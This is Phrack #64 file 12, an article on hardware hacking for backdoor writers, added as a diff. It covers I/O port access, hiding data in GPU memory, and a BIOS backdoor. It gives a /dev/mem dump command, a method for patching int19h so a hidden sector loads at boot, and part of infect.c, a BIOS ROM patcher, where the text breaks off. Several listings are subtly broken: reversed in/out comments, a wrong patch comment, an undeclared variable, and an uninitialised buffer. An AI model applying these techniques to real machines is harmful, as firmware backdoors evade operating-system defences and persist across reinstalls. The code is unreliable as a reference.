@@ -1,0 +1,1263 @@
+
+              _                                                _
+            _/B\_                                            _/W\_
+            (* *)            Phrack #64 file 12              (* *)
+            | - |                                            | - |
+            |   |       Hacking deeper in the system         |   |
+            |   |                                            |   |
+            |   |               by scythale                  |   |
+            |   |                                            |   |
+            |   |            scythale@gmail.com              |   |
+            (____________________________________________________)
+
+
+
+Contents
+
+	1.  Abstract
+	2.  A quick introduction to I/O system
+	3.  Playing with GPU
+	4.  Playing with BIOS
+	5.  Conclusion
+	6.  References
+	7.  Thanks
+
+
+
+1.  Abstract
+
+
+     Today, we're observing a growing number of papers focusing on hardware
+hacking. Even if hardware-based backdoors are far from being a good
+solution to use in the wild, this topic is very important as some big
+corporations are planning to take control of our computers without our
+consent using some really bad designed concepts such as DRM and TCPA.
+As we can't let them do this at any cost, the time has come for a little
+introduction to the hardware world...
+
+     This paper constitutes a tiny introduction to hardware hacking in the
+backdoor writers perspective (hey, this is phrack, I'm not going to explain
+how to pilot your coffee machine with a RS232 interface). The thing is
+even if backdooring hardware isn't a so good idea, it is a good way to
+start in hardware hacking. The aim of the author is to give readers the
+basis of hardware hacking which should be usefull to prepare for the fight
+against TCPA and other crappy things sponsored by big sucke... erm...
+"companies" such as Sony and Microsoft.
+
+     This paper is i386 centric. It does not cover any other architecture,
+but it can be used as a basis on researches about other hardware. Thus
+bear in mind that most of the material presented here won't work on any
+other machine than a PC. Subjects such as devices, BIOS and internal work
+of a PC will be discussed and some ideas about turning all these things to
+our own advantage will be presented.
+
+     This paper IS NOT an ad nor a presentation of some 3v1L s0fTw4r3,     
+so you won't find a fully functionnal backdoor here. The aim of the author
+is to provide information that would help you in writing your own stuff,
+not to provide you with an already done work. This subject isn't a
+particularly difficult one, all it just takes is immagination.
+
+     In order to understand this article, some knowledge about x86 assembly
+and architecture is heavily recommended. If you're a newbie to these
+subjects, I strongly recommend you to read "The Art of Assembly
+Programming" (see [1]).
+
+
+2.  A quick introduction to I/O system
+
+
+     Before digging straight into the subject, some explanations must be
+done. Those of you who already know how I/O works on Intel's and what
+they're here for might just prefer to skip to the next section. Others,
+just keep on reading. 
+
+     As this paper focuses on hardware, it would be practical to know how
+to access it. The I/O system provides such an access. As everybody knows,
+the processor (CPU) is the heart, or, more accurately, the brain of the
+computer. But the only thing it does is to compute. Basically, a CPU isn't
+of much help without devices. Devices give data to be computed to the CPU,
+and allow it to bring back an answer to our requests. The I/O system is
+used to link most of devices to the CPU. The way processors see I/O based
+devices is quite the same as the way they see memory. In fact, all the
+processors do to communicate with devices is to read and write data
+"somewhere in memory" : the I/O system is charged to handle the next steps.
+This "somewhere in memory" is represented by an I/O port. I/O ports are
+special "addresses" that connects the CPU data bus to the device. Each I/O
+based device uses at least one I/O port, many of them using several. 
+Basically, the only thing device drivers do is to manipulate I/O ports
+(well, very basically, that's what they do, just to communicate with
+hardware). The Intel Architecture provides three main ways to manipulate
+I/O ports : memory-mapped I/O, Input/Output mapped I/O and DMA.
+
+
+      memory-mapped I/O
+
+   The memory-mapped I/O system allows to manipulate I/O ports as if they
+were basic memory. Instructions such as 'mov' are used to interface with
+it. This system is simple : all it does is to map I/O ports to memory
+addresses so that when data is written/read at one of these addresses, the
+data is actually sent to/received by the device connected to the
+corresponding port. Thus, the way to communicate with a device is the same
+as communicating with memory.
+
+
+      Input/Output mapped I/O
+
+   The Input/Output mapped I/O system uses dedicated CPU instructions to
+access I/O ports. On i386, these instructions are 'in' and 'out' :
+
+       in 254, reg   ; writes content of reg register to port #254
+
+       out reg, 254  ; reads data from port #254 and stores it in reg
+
+
+    The only problem with these two instructions is that the port is
+8 bit-encoded, allowing only an access to ports 0 to 255. The sad thing is
+that this range of ports is often connected to internal hardware such as
+the system clock. The way to circomvent it is the following (taken from
+"The Art of Assembly Programming, see [1]) :
+
+To access I/O ports at addresses beyond 255 you must load the 16-bit I/O
+address into the DX register and use DX as a pointer to the specified I/O
+address. For example, to write a byte to the I/O address $378 you would use
+an instruction sequence like the following:
+
+   mov $378, dx
+   out al, dx
+
+
+     DMA
+
+     DMA stands for Direct Memory Access. The DMA system is used to enhance
+devices to memory performances. Back in the old days, most hardware made
+use of the CPU to transfer data to and from memory. When computers started 
+to become "multimedia" (a term as meaningless as "people ready" but really 
+good looking in "we-are-trying-to-fuck-you-deep-in-the-ass ads"), that is
+when computers started to come equiped with CD-ROM and sound cards, CPU
+couldn't handle tasks such as playing music while displaying a shotgun
+firing at a monster because the user just has hit the 'CTRL' key. So,
+constructors created a new chip to be able to carry out such things, and so
+was born the DMA controller. DMA allows devices to transfer data from and
+to memory with little operations done by the CPU. Basically, all the CPU
+does is to initiate the DMA transfer and then the DMA chip takes care of
+the rest, allowing the CPU to focus on other tasks. The very interesting
+thing is that since the CPU doesn't actually do the transfer and since
+devices are being used, protected mode does not interfere, which means we
+can write and read (almost) anywhere we would like to. This idea is far
+from being new, and PHC already evoqued it in one of their phrack parody.
+
+      DMA is really a powerfull system. It allows us to do very cool
+tricks but this come as the expense of a great prize : DMA is a pain in
+the ass to use as it is very hardware specific. Here follows the main
+different kinds of DMA systems :
+
+	- DMA Controller (third-party DMA) : this DMA system is really old
+and inefficient. The idea here is to have a general DMA Controller on the
+motherboard that will handle every DMA operations for every devices. This
+controller was mainly used with ISA devices and its use is now deprecated
+because of performance issues and because only 4 to 8 (depending if the
+board had two cascading DMA Controllers) DMA transfers could be setup at
+the same time (the DMA Controller only provides 4 channels).
+
+	- DMA Bus mastering (first-party DMA) : this DMA system provides
+far better performances than the DMA Controller. The idea is to allow
+each device to manage DMA himself by a processus known as "Bus Mastering".
+Instead of relying on the general DMA Controller, each device is able to
+take control of the system bus to perform its transfers, allowing hardware
+manufacturers to provide an efficient system for their devices.
+
+
+    These three things are practical enough to get started but modern
+operating systems provides medias to access I/O too. As there are a lot of
+these systems on the computer market, I'll introduce only the GNU/Linux
+system, which constitutes a perfect system to discover hardware hacking on
+Intel. As many systems, Linux is run in two modes : user land and kernel
+land. Since Kernel land already allows a good control on the system, let's
+see the user land ways to access I/O. I'll explain here two basic ways to
+play with hardware : in*(), out*() and /dev/port :
+
+
+    in/out
+
+    The in and out instructions can be used on Linux in user land. Equally,
+the functions outb(2), outw(2), outl(2), inb(2), inw(2), inl(2) are
+provided to play with I/O and can be called from kernel land or user land.
+As stated in "Linux Device Drivers" (see [2]), their use is the following :
+
+    unsigned	inb(unsigned port);
+    void	outb(unsigned char byte, unsigned port);
+
+Read or write byte ports (eight bits wide). The port argument is defined as
+unsigned long for some platforms and unsigned short for others. The return
+type of inb is also different across architectures.
+
+   unsigned	inw(unsigned port);
+   void		outw(unsigned short word, unsigned port);
+
+These functions access 16-bit ports (word wide); they are not available
+when compiling for the M68k and S390 platforms, which support only byte
+I/O.
+
+   unsigned	inl(unsigned port);
+   void		outl(unsigned longword, unsigned port);
+
+These functions access 32-bit ports. longword is either declared as
+unsigned long or unsigned int, according to the platform. Like word I/O,
+"long" I/O is not available on M68k and S390.
+
+    Note that no 64-bit port I/O operations are defined. Even on 64-bit
+architectures, the port address space uses a 32-bit (maximum) data path.
+
+    The only restriction to access I/O ports this way from user land is
+that you must use iopl(2) or ioperm(2) functions, which sometimes are
+protected by security systems like grsec. And of course, you must be root.
+Here is a sample code using this way to access I/O :
+
+------[io.c
+
+/*
+** Just a simple code to see how to play with inb()/outb() functions.
+**
+** usage is :
+**	* read : io r <port address>
+**	* write : io w <port address> <value>
+**
+** compile with : gcc io.c -o io
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/io.h>	/* iopl(2) inb(2) outb(2) */
+
+
+void		read_io(long port)
+{
+  unsigned int	val;
+
+  val = inb(port);
+  fprintf(stdout, "value : %X\n", val);
+}
+
+void		write_io(long port, long value)
+{
+  outb(value, port);
+}
+
+int	main(int argc, char **argv)
+{
+  long	port;
+
+  if (argc < 3)
+    {
+      fprintf(stderr, "usage is : io <r|w> <port> [value]\n");
+      exit(1);
+    }
+  port = atoi(argv[2]);
+  if (iopl(3) == -1)
+    {
+      fprintf(stderr, "could not get permissions to I/O system\n");
+      exit(1);
+    }
+  if (!strcmp(argv[1], "r"))
+    read_io(port);
+  else if (!strcmp(argv[1], "w"))
+    write_io(port, atoi(argv[3]));
+  else
+    {
+      fprintf(stderr, "usage is : io <r|w> <port> [value]\n");
+      exit(1);
+    }
+  return 0;
+}
+
+------
+
+
+    /dev/port
+
+    /dev/port is a special file that allows you to access I/O as if you
+were manipulating a simple file. The use of the functions open(2), read(2),
+write(2), lseek(2) and close(2) allows manipulation of /dev/port. Just go
+to the address corresponding to the port with lseek() and read() or write()
+to the hardware. Here is a sample code to do it :
+
+------[port.c
+
+/*
+** Just a simple code to see how to play with /dev/port
+**
+** usage is :
+**	* read : port r <port address>
+**	* write : port w <port address> <value>
+**
+** compile with : gcc port.c -o port
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+
+void		read_port(int fd, long port)
+{
+  unsigned int	val = 0;
+
+  lseek(fd, port, SEEK_SET);
+  read(fd, &val, sizeof(char));
+  fprintf(stdout, "value : %X\n", val);
+}
+
+void		write_port(int fd, long port, long value)
+{
+  lseek(fd, port, SEEK_SET);
+  write(fd, &value, sizeof(char));
+}
+
+int	main(int argc, char **argv)
+{
+  int	fd;
+  long	port;
+
+  if (argc < 3)
+    {
+      fprintf(stderr, "usage is : io <r|w> <port> [value]\n");
+      exit(1);
+    }
+  port = atoi(argv[2]);
+  if ((fd = open("/dev/port", O_RDWR)) == -1)
+    {
+      fprintf(stderr, "could not open /dev/port\n");
+      exit(1);
+    }
+  if (!strcmp(argv[1], "r"))
+    read_port(fd, port);
+  else if (!strcmp(argv[1], "w"))
+    write_port(fd, port, atoi(argv[3]));
+  else
+    {
+      fprintf(stderr, "usage is : io <r|w> <port> [value]\n");
+      exit(1);
+    }
+  return 0;
+}
+
+
+------
+
+
+
+    Ok, one last thing before closing this introduction : for Linux users
+who want to list the I/O Ports on their system, just do a
+"cat /proc/ioports", ie:
+
+     $ cat /proc/ioports # lists ports from 0000 to FFFF
+     0000-001f : dma1
+     0020-0021 : pic1
+     0040-0043 : timer0
+     0050-0053 : timer1
+     0060-006f : keyboard
+     0080-008f : dma page reg
+     00a0-00a1 : pic2
+     00c0-00df : dma2
+     00f0-00ff : fpu
+     0170-0177 : ide1
+     01f0-01f7 : ide0
+     0213-0213 : ISAPnP
+     02f8-02ff : serial
+     0376-0376 : ide1
+     0378-037a : parport0
+     0388-0389 : OPL2/3 (left)
+     038a-038b : OPL2/3 (right)
+     03c0-03df : vga+
+     03f6-03f6 : ide0
+     03f8-03ff : serial
+     0534-0537 : CS4231
+     0a79-0a79 : isapnp write
+     0cf8-0cff : PCI conf1
+     b800-b8ff : 0000:00:0d.0
+       b800-b8ff : 8139too
+     d000-d0ff : 0000:00:09.0
+       d000-d0ff : 8139too
+     d400-d41f : 0000:00:04.2
+       d400-d41f : uhci_hcd
+     d800-d80f : 0000:00:04.1
+       d800-d807 : ide0
+       d808-d80f : ide1
+     e400-e43f : 0000:00:04.3
+       e400-e43f : motherboard
+       e400-e403 : PM1a_EVT_BLK
+       e404-e405 : PM1a_CNT_BLK
+       e408-e40b : PM_TMR
+       e40c-e40f : GPE0_BLK
+       e410-e415 : ACPI CPU throttle
+     e800-e81f : 0000:00:04.3
+       e800-e80f : motherboard
+         e800-e80f : pnp 00:02
+     $
+
+
+
+3.  Playing with GPU
+
+
+     3D cards are just GREAT, period. When you're installing such a card in
+your computer, you're not just plugging a device that can render nice
+graphics, you're also putting a mini-computer in your own computer. Today's
+graphical cards aren't a simple chip anymore. They have memory, they have a
+processor, they even have a BIOS ! You can enjoy a LOT of features from
+these little things.
+
+     First of all, let's consider what a 3D card really is. 3D cards are
+here to enhance your computer performances rendering 3D and to send output
+for your screen to display. As I said, there are three parts that interest
+us in our 3v1L doings :
+
+       1/ The Video RAM. It is memory embedded on the card. This memory is
+used to store the scene to be rendered and to store computed results. Most
+of today's cards come with more than 256 MB of memory, which provide us a
+nice place to store our stuff.
+
+       2/ The Graphical Processing Unit (shortly GPU). It constitutes the
+processor of your 3D card. Most of 3D operations are maths, so most of the
+GPU instructions compute maths designed to graphics.
+
+       3/ The BIOS. A lot of devices include today their own BIOS. 3D cards
+make no exception, and their little BIOS can be very interesting as they
+contain the firmware of your 3D card, and when you access a firmware, well,
+you can just nearly do anything you dream to do.
+
+       I'll give ideas about what we can do with these three elements, but
+first we need to know how to play with the card. Sadly, as to play with any
+device in your computer, you need the specs of your material and most 3D
+cards are not open enough to do whatever we want. But this is not a big
+problem in itself as we can use a simple API which will talk with the card
+for us. Of course, this prevents us to use tricks on the card in certain
+conditions, like in a shellcode, but once you've gained root and can do
+what pleases you to do on the system it isn't an issue anymore. The API I'm
+talking about is OpenGL (see [3]), and if you're not already familiar with
+it, I suggest you to read the tutorials on [4]. OpenGL is a 3D programming 
+API defined by the OpenGL Architecture Review Board which is composed of
+members from many of the industry's leading graphics vendors. This library
+often comes with your drivers and by using it, you can develop easily
+portable code that will use features of the present 3D card.
+
+       As we now know how to communicate with the card, let's take a deeper
+look at this hardware piece. GPU are used to transform a 3D environment
+(the "scene") given by the programmer into a 2D image (your screen).
+Basically, a GPU is a computing pipeline applying various mathematical
+operations on data. I won't introduce here the complete process of
+transforming a 3D scene into a 2D display as it is not the point of this
+paper. In our case, all you have to know is :
+
+   1/ The GPU is used to transform input (usually a 3D scene but nothing
+prevents us from inputing anything else)
+
+   2/ These transformations are done using mathematical operations commonly
+used in graphical programming (and again nothing prevents us from using
+those operations for another purpose)
+
+   3/ The pipeline is composed of two main computations each involving
+multiple steps of data transformation :
+
+	 - Transformation and Lighting : this step translates 3D objects
+	 into 2D nets of polygons (usually triangles), generating a
+	 wireframe rendering.
+
+	 - Rasterization : this step takes the wireframe rendering as input
+	 data and computes pixels values to be displayed on the screen.
+
+      So now, let's take a look at what we can do with all these features.
+What interests us here is to hide data where it would be hard to find it
+and to execute instructions outside the processor of the computer. I won't
+talk about patching 3D cards firmware as it requires heavy reverse
+engineering and as it is very specific for each card, which is not the
+subject of this paper.
+
+	First, let's consider instructions execution. Of course, as we are
+playing with a 3D card, we can't do everything we can do with a computer
+processor like triggering software interrupts, issuing I/O operations or
+manipulating memory, but we can do lots of mathematical operations. For
+example, we can encrypt and decrypt data with the 3D card's processor
+which can render the reverse engineering task quite painful. Also, it can
+speed up programs relying on heavy mathematical operations by letting the
+computer processor do other things while the 3D card computes for him. Such
+things have already been widely done. In fact, some people are already
+having fun using GPU for various purposes (see [5]). The idea here is to
+use the GPU to transform data we feed him with. GPUs provide a system to
+program them called "shaders". You can think of shaders as a programmable
+hook within the GPU which allows you to add your own routines in the data
+transformation processus. These hooks can be triggered in two places of the
+computing pipeline, depending on the shader you're using. Traditionnaly,
+shaders are used by programmers to add special effects on the rendering
+process and as the rendering process is composed of two steps, the GPU
+provides two programmable shaders. The first shader is called the
+"Vexter shader". This shader is used during the transformation and lighting
+step. The second shader is called the "Pixel shader" and this one is used
+during the rasterization processus.
+
+	  Ok, so now we have two entry points in the GPU system, but this
+doesn't tell us how to develop and inject our own routines. Again, as we
+are playing in the hardware world, there are several ways to do it,
+depending on the hardware and the system you're running on. Shaders use
+their own programming languages, some are low level assembly-like
+languages, some others are high level C-like languages. The three main
+languages used today are high level ones :
+
+      - High-Level Shader Language (HLSL) : this language is provided by
+      Microsoft's DirectX API, so you need MS Windows to use it. (see [6])
+
+      - OpenGL Shading Language (GLSL or GLSlang) : this language is
+      provided by the OpenGL API. (see [7])
+
+      - Cg : this language was introduced by NVIDIA to program on their
+      hardware using either the DirectX API or the OpenGL one. Cg comes
+      with a full toolkit distributed by NVIDIA for free (see [8] and [9]).
+
+    Now that we know how to program GPUs, let's consider the most
+interesting part : data hiding. As I said, 3D cards come with a nice
+amount of memory. Of course, this memory is aimed at graphical usage but
+nothing prevents us to store some stuff in it. In fact, with the help of
+shaders we can even ask the 3D card to store and encrypt our data. This is
+fairly easy to do : we put the data in the beginning of the pipeline, we
+program the shaders to decide how to store and encrypt it and we're done.
+Then, retrieving this data is nearly the same operation : we ask the
+shaders to decrypt it and to send it back to us. Note that this encryption
+is really weak, as we rely only on shaders' computing and as the encryption
+and decryption process can be reversed by simply looking at the shaders
+programming in your code, but this can constitutes an effective way to
+improve already existing tricks (a 3D card based Shiva could be fun).
+
+    Ok, so now we can start coding stuff taking advantage of our 3D cards.
+But wait ! We don't want to mess with shaders, we don't want to learn
+about 3D programming, we just want to execute code on the device so we can
+quickly test what we can do with those devices. Learning shaders
+programming is important because it allows to understand the device better
+but it can be really long for people unfamiliar with the 3D world.
+Recently, nVIDIA released a SDK allowing programmers to easily use 3D
+devices for other purposes than graphisms. nVIDIA CUDA (see [10]) is a SDK
+allowing programmers to use the C language with new keywords used to tell
+the compiler which part of the code should be executed on the device and
+which part of the code should be executed on the CPU. CUDA also comes with
+various mathematical libraries.
+
+     Here is a funny code to illustrate the use of CUDA :
+
+------[ 3ddb.c
+
+/*
+** 3ddb.c : a very simple program used to store an array in
+** GPU memory and make the GPU "encrypt" it. Compile it using nvcc.
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+#include <cutil.h>
+#include <cuda.h>
+
+
+/*** GPU code and data ***/
+
+char *		store;
+
+
+__global__ void	encrypt(int key)
+{
+  /* do any encryption you want here */
+  /* and put the result into 'store' */
+  /* (you need to modify CPU code if */
+  /* the encrypted text size is      */
+  /* different than the clear text   */
+  /* one). */
+}
+
+/*** end of GPU code and data ***/
+
+
+/*** CPU code and data ***/
+CUdevice	dev;
+
+void		usage(char * cmd)
+{
+  fprintf(stderr, "usage is : %s <string> <key>\n", cmd);
+  exit(0);
+}
+
+
+void		init_gpu()
+{
+  int		count;
+
+  CUT_CHECK_DEVICE();
+  CU_SAFE_CALL(cuInit());
+  CU_SAFE_CALL(cuDeviceGetCount(&count));
+  if (count <= 0)
+    {
+      fprintf(stderr, "error : could not connect to any 3D card\n");
+      exit(-1);
+    }
+  CU_SAFE_CALL(cuDeviceGet(&dev, 0));
+  CU_SAFE_CALL(cuCtxCreate(dev));
+}
+
+
+int		main(int argc, char ** argv)
+{
+  int		key;
+  char *	res;
+
+  if (argc != 3)
+    usage(argv[0]);
+  init_gpu();
+  CUDA_SAFE_CALL(cudaMalloc((void **)&store, strlen(argv[1])));
+  CUDA_SAFE_CALL(cudaMemcpy(store,
+			    argv[1],
+			    strlen(argv[1]),
+			    cudaMemcpyHostToDevice));
+  res = malloc(strlen(argv[1]));
+  key = atoi(argv[2]);
+  encrypt<<<128, 256>>>(key);
+  CUDA_SAFE_CALL(cudaMemcpy(res,
+			    store,
+			    strlen(argv[1]),
+			    cudaMemcpyDeviceToHost));
+  for (i = 0; i < strlen(argv[1]); i++)
+    printf("%c", res[i]);
+  CU_SAFE_CALL(cuCtxDetach());
+  CUT_EXIT(argc, argv);
+  return 0;
+}
+
+------
+
+
+
+4.  Playing with BIOS
+
+
+     BIOSes are very interesting. In fact, little work has already been
+done in this area and some stuff has already been published. But let's
+recap all this things and take a look at what wonderful tricks we can do
+with this little chip. First of all, BIOS means Basic Input/Output System.
+This chip is in charge of handling boot process, low-level configuration
+and of providing a set of functions for boot loaders and operating systems
+during their early loading processus. In fact, at boot time, BIOS takes
+control of the system first, then it does a couple of checks, then it sets
+an IDT to provide features via interruptions and finally tries to load the
+boot loader located in each bootable device, following its configuration.
+For example, if you specify in your BIOS setup to first try to boot on
+optical drive and then on your harddrive, at boot time the BIOS will first
+try to run an OS from the CD, then from your harddrive. BIOSes' code is the
+VERY FIRST code to be executed on your system. The interesting thing is
+that backdooring it virtually gives us a deep control of the system and a
+practical way to bypass nearly any security system running on the target,
+since we execute code even before this system starts ! But the inconvenient
+of this thing is big : as we are playing with hardware, portability becomes
+a really big issue.
+
+     The first thing you need to know about playing with BIOS is that there
+are several ways to do it. Some really good publications (see [11]) have
+been made on the subject, but I'll focus on what we can do when patching
+the ROM containing the BIOS.
+
+      BIOSes are stored in a chip located on your motherboard. Old BIOSes
+were  single ROMs without write possibilities, but then some manufacturers
+got the brilliant idea to allow BIOS patching. They introduced the BIOS
+flasher, which is a little device we can communicate with using the I/O
+system. The flasher can read and write the BIOS for us, which is all we
+need to play in this land. Of course, as there are many different BIOSes
+in the wild, I won't introduce any particular chip. Here are some pointers
+that will help you :
+
+      * [12] /dev/bios is a tool from the OpenBIOS initiative (see [13]).
+It is a kernel module for Linux that creates devices to easily manipulate
+various BIOSes. It can access several BIOSes, including network card
+BIOSes. It is a nice tool to play with and the code is nice, so you'll see 
+how to get your hands to work.
+
+      * [14] is a WONDERFUL guide that will explain you nearly everything
+about Award BIOSes. This paper is a must read for anyone interested in this
+subject, even if you don't own an Award BIOS.
+
+      * [15] is an interesting website to find information about various
+BIOSes.
+
+      In order to start easy and fast, we'll use a virtual machine, which
+is very handy to test your concepts before you waste your BIOS. I
+recommend you to use Bochs (see [16]) as it is free and open source and
+mainly because it comes with a very well commented source code used to
+emulate a BIOS. But first, let's see how BIOSes really work.
+
+       As I said, BIOS is the first entity which has the control over your
+system at boottime. The interesting thing is, in order to start to reverse
+engineer your BIOS, that you don't even need to use the flasher. At the
+start of the boot process, BIOS's code is mapped (or "shadowed") in RAM at
+a specific location and uses a specific range of memory. All we have to do
+to read this code, which is 16 bits assembly, is to read memory. BIOS
+memory area starts at 0xf0000 and ends at 0x100000. An easy way to dump
+the code is to simply do a :
+
+   % dd if=/dev/mem of=BIOS.dump bs=1 count=65536 seek=983040
+   % objdump -b binary -m i8086 -D BIOS.dump
+
+   You should note that as BIOS contains data, such a dump isn't accurate
+as you will have a shift preventing code to be disassembled correctly. To
+address this problem, you should use the entry points table provided
+farther and use objdump with the '--start-address' option.
+
+      Of course, the code you see in memory is rarely easy to retrieve in
+the chip, but the fact you got the somewhat "unencrypted text" can help a
+lot. To get started to see what is interesting in this code, let's have a
+look at a very interesting comment in the Bochs BIOS source code
+(from [17]) :
+
+
+	 30 // ROM BIOS compatability entry points:
+	 31 // ===================================
+	 32 // $e05b ; POST Entry Point
+	 33 // $e2c3 ; NMI Handler Entry Point
+	 34 // $e3fe ; INT 13h Fixed Disk Services Entry Point
+	 35 // $e401 ; Fixed Disk Parameter Table
+	 36 // $e6f2 ; INT 19h Boot Load Service Entry Point
+	 37 // $e6f5 ; Configuration Data Table
+	 38 // $e729 ; Baud Rate Generator Table
+	 39 // $e739 ; INT 14h Serial Communications Service Entry Point
+	 40 // $e82e ; INT 16h Keyboard Service Entry Point
+	 41 // $e987 ; INT 09h Keyboard Service Entry Point
+	 42 // $ec59 ; INT 13h Diskette Service Entry Point
+	 43 // $ef57 ; INT 0Eh Diskette Hardware ISR Entry Point
+	 44 // $efc7 ; Diskette Controller Parameter Table
+	 45 // $efd2 ; INT 17h Printer Service Entry Point
+	 46 // $f045 ; INT 10 Functions 0-Fh Entry Point
+	 47 // $f065 ; INT 10h Video Support Service Entry Point
+	 48 // $f0a4 ; MDA/CGA Video Parameter Table (INT 1Dh)
+	 49 // $f841 ; INT 12h Memory Size Service Entry Point
+	 50 // $f84d ; INT 11h Equipment List Service Entry Point
+	 51 // $f859 ; INT 15h System Services Entry Point
+	 52 // $fa6e ; Character Font for 320x200 & 640x200 Graphics \
+	 (lower 128 characters)
+	 53 // $fe6e ; INT 1Ah Time-of-day Service Entry Point
+	 54 // $fea5 ; INT 08h System Timer ISR Entry Point
+	 55 // $fef3 ; Initial Interrupt Vector Offsets Loaded by POST
+	 56 // $ff53 ; IRET Instruction for Dummy Interrupt Handler
+	 57 // $ff54 ; INT 05h Print Screen Service Entry Point
+	 58 // $fff0 ; Power-up Entry Point
+	 59 // $fff5 ; ASCII Date ROM was built - 8 characters in MM/DD/YY
+	 60 // $fffe ; System Model ID
+
+	 These offsets indicate where to find specific BIOS
+functionalities in memory and, as they are standard, you can apply them to
+your BIOS too. For example, the BIOS interruption 19h is located in memory
+at 0xfe6f2 and its job is to load the boot loader in RAM and to jump on it.
+On old systems, a little trick was to jump to this memory location to
+reboot the system. But before considering BIOS code modification, we have
+one issue to resolve : BIOS chips have limited space, and if it can
+provide enough space for basic backdoors, we'll end up quickly begging for
+more places to store code if we want to do something nice. We have two ways
+to get more space :
+
+     1/ We patch the int19h code so that instead of loading the real
+bootloader on a device specified, it loads our code (which will load the
+real bootloader once it's done) at a specific location, like a sector
+marked as defective on a specific hard drive. Of course, this operation
+implies alteration of another media than BIOS, but, since it provides us
+with as nearly as many space as we could dream, this method must be taken
+into consideration
+
+     2/ If you absolutely want to stay in BIOS space, you can do a little
+trick on some BIOS models. One day, processors manufacturers made a deal
+with BIOS manufacturers. Processor manufacturers decided to give the
+possibility to update the CPU's microcode in order to fix bugs without
+having to recall all sold material (remember the f00f bug ?). The idea was
+that the BIOS would store the updated microcode and inject it in the CPU
+during each boot process, as modifications on microcode aren't permanent.
+This feature is known as "BIOS update". Of course, this microcode takes
+space and we can search for the code injecting it, hook it so it doesn't do
+anything anymore and erase the microcode to store our own code.
+
+
+	  Implementing 2/ is more complex than 1/, so we'll focus on the
+first one to get started. The idea is to make the BIOS load our own code
+before the bootloader. This is very easy to do. Again, BochsBIOS sources
+will come in handy, but if you look at your BIOS dump, you should see very
+little differences. The code which interests us is located at 0xfe6f2 and
+is the 19h BIOS interrupt. This one is very interesting as this is the one
+in charge of loading the boot loader. Let's take a look at the interesting 
+part of its code :
+
+       7238   // We have to boot from harddisk or floppy
+       7239   if (bootcd == 0) {
+       7240     bootseg=0x07c0;
+       7241 
+       7242 ASM_START
+       7243     push bp	
+       7244     mov  bp, sp
+       7245 
+       7246     mov  ax, #0x0000
+       7247     mov  _int19_function.status + 2[bp], ax	
+       7248     mov  dl, _int19_function.bootdrv + 2[bp]
+       7249     mov  ax, _int19_function.bootseg + 2[bp]
+       7250     mov  es, ax         ;; segment		
+       7251     mov  bx, #0x0000    ;; offset		
+       7252     mov  ah, #0x02      ;; function 2, read diskette sector
+       7253     mov  al, #0x01      ;; read 1 sector	
+       7254     mov  ch, #0x00      ;; track 0		
+       7255     mov  cl, #0x01      ;; sector 1		
+       7256     mov  dh, #0x00      ;; head 0
+       7257     int  #0x13          ;; read sector
+       7258     jnc  int19_load_done
+       7259     mov  ax, #0x0001
+       7260     mov  _int19_function.status + 2[bp], ax
+       7261 
+       7262 int19_load_done:
+       7263     pop  bp
+       7264 ASM_END
+	
+
+	int13h is the BIOS interruption used to access storage devices. In
+our case, BIOS is trying to load the boot loader, which is on the first
+sector of the drive. The interesting thing is that by only changing the
+value put in one register, we can make the BIOS load our own code. For
+instance, if we hide our code in the sector number 0xN and if we patch the
+BIOS so that instead of the instruction 'mov cl, #0x01' we have
+'mov cl, #0xN', we can have our code loaded at each boot and reboot.
+Basically, we can store our code wherever we want to as we can change the
+sector, the track and even the drive to be used. It is up to you to chose
+where to store your code but as I said, a sector marked as defective can
+work out as an interesting trick.
+
+       Here are three source codes to help you get started faster : the
+first one, inject.c, modifies the ROM of the BIOS so that it loads our code
+before the boot loader. inject.c needs /dev/bios to run. The second one,
+code.asm, is a skeletton to fill with your own code and is loaded by the
+BIOS. The third one, store.c, inject code.asm in the target sector of the
+first track of the hard drive.
+
+
+--[ infect.c
+
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define BUFSIZE		512
+#define BIOS_DEV	"/dev/bios"
+
+#define CODE		"\xbb\x00\x00"  /* mov bx, 0 */ \
+			"\xb4\x02"      /* mov ah, 2 */ \
+			"\xb0\x01"      /* mov al, 1 */ \
+			"\xb5\x00"      /* mov ch, 0 */ \
+			"\xb6\x00"      /* mov dh, 0 */ \
+			"\xb1\x01"      /* mov cl, 1 */ \
+			"\xcd\x13"      /* int 0x13 */
+
+#define TO_PATCH	"\xcd\x13" 	 /* mov cl, 1 */
+
+#define SECTOR_OFFSET	1
+
+
+void	usage(char *cmd)
+{
+  fprintf(stderr, "usage is : %s [bios rom] <sector> <infected rom>\n", cmd);
+  exit(1);
+}
+
+
+/*
+** This function looks in the BIOS rom and search the int19h procedure.
+** The algorithm used sucks, as it does only a naive search. Interested
+** readers should change it.
+*/
+char *	search(char * buf, size_t size)
+{
+  return memmem(buf, size, CODE, sizeof(CODE));
+}
+
+
+void	patch(char * tgt, size_t size, int sector)
+{
+  char		new;
+  char *	tmp;
+
+  tmp = memmem(tgt, size, TO_PATCH, sizeof(TO_PATCH));
+  new = (char)sector;
+  tmp[SECTOR_OFFSET] = new;
+}
+
+
+int		main(int argc, char **argv)
+{
+  int		sector;
+  size_t	i;
+  size_t	ret;
+  size_t       	cnt;
+  int		devfd;
+  int		outfd;
+  char *	buf;
+  char *	dev;
+  char *	out;
+  char *	tgt;
+
+  if (argc == 3)
+    {
+      dev = BIOS_DEV;
+      out = argv[2];
+      sector = atoi(argv[1]);
+    }
+  else if (argc == 4)
+    {
+      dev = argv[1];
+      out = argv[3];
+      sector = atoi(argv[2]);
+    }
+  else
+    usage(argv[0]);
+  if ((devfd = open(dev, O_RDONLY)) == -1)
+    {
+      fprintf(stderr, "could not open BIOS\n");
+      exit(1);
+    }
+  if ((outfd = open(out, O_WRONLY | O_TRUNC | O_CREAT)) == -1)
+    {
+      fprintf(stderr, "could not open %s\n", out);
+      exit(1);
+    }
+  for (cnt = 0; (ret = read(devfd, buf, BUFSIZE)) > 0; cnt += ret)
+    buf = realloc(buf, ((cnt + ret) / BUFSIZE + 1) * BUFSIZE);
+  if (ret == -1)
+    {
+      fprintf(stderr, "error reading BIOS\n");
+      exit(1);
+    }
